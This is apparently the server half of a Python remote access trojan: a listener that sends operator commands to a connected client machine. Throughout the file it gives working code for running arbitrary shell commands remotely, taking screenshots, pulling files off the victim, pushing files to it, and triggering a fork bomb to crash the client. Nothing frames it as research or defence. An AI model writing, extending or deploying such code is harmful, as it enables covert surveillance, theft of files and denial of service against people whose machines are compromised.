from socket import socket, AF_INET, SOCK_STREAM
from base64 import b64decode, b64encode
import os

s = socket(AF_INET, SOCK_STREAM)
s.bind(("127.0.0.1", 1234))

s.listen()
print("[*] Server started. Listening for incoming connections...")

while True:
    conn, addr = s.accept()
    print(f"\n[*] Received connection from {addr[0]}:{addr[1]}")

    try:
        while True:
            inp = input("$ ")
            if not inp.strip():
                continue
            
            cmd = inp + '\n'
            
            # close connection
            if inp.lower() in {'q', 'quit'}:
                conn.send(cmd.encode())
                resp = conn.recv(1024).decode()
                print(resp)
                conn.close()
                print("[*] Server is shutting down.")
                exit(0)
            
            # screenshot
            elif inp.lower() == "screenshot":
                conn.send(cmd.encode())
                b64_string = ''

                while True:
                    tmp = conn.recv(32768).decode()
                    b64_string += tmp
                    if len(tmp) < 32768:
                        break
                
                with open('screenshot.png', 'wb') as f:
                    f.write(b64decode(b64_string))

                print("Screenshot saved")
            
            # download
            elif inp.split(' ')[0].lower() == "download":
                conn.send(cmd.encode())
                b64_string = ''

                while True:
                    tmp = conn.recv(32768).decode()
                    b64_string += tmp
                    if len(tmp) < 32768:
                        break
                
                if "not found" in b64_string:
                    print(b64_string)
                    continue

                file_name, b64_string = b64_string.split(':', 1)
                with open(file_name, 'wb') as f:
                    f.write(b64decode(b64_string))
                
                print("File downloaded")

            # upload
            elif inp.split(' ')[0].lower() == "upload":
                file_name = inp.split(' ')[1].strip()
                if not os.path.exists(file_name):
                    print("File not found")
                else:
                    with open(file_name, 'rb') as f:
                        file_content = b64encode(f.read())
                    tmp = ":".join([file_name, file_content.decode('ascii')]) + "\n"
                    conn.send(tmp.encode())
                    resp = conn.recv(1024).decode()
                    print(resp)
                    
            # Boilerplate for sending a command without waiting for a response
            elif inp.strip().lower() == "fork_bomb":
                conn.send(cmd.encode())
                print("[*] Fork bomb triggered. Closing this connection and waiting for a new one.")
                break
            
            # shell commands and other commands
            else:
                conn.send(cmd.encode())
                res = conn.recv(32768).decode()
                print(res)
    except (ConnectionResetError, BrokenPipeError):
        print("\n[*] Connection to client lost. Waiting for a new connection.")
    finally:
        conn.close()